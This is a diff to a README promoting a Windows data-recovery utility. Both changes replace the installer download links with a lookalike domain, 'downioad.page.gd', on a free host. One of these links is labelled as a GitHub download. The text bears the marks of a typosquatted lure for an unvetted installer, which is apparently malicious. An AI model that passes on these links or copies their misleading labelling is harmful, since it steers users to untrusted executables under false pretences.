@@ -2,7 +2,7 @@
 
 Raise Data Recovery is a powerful utility designed specifically for Windows 10 and Windows 11 systems. It enables users to retrieve lost or deleted files from various storage devices with high reliability and ease of use. With its modern interface and robust algorithms, this tool ensures a high success rate in data recovery scenarios, making it an essential solution for personal and professional needs.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -63,7 +63,7 @@ A: Ensure the drive is properly connected, avoid writing new data to it, and try
 
 For the latest version, updates, and detailed documentation, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## License and Disclaimer
 
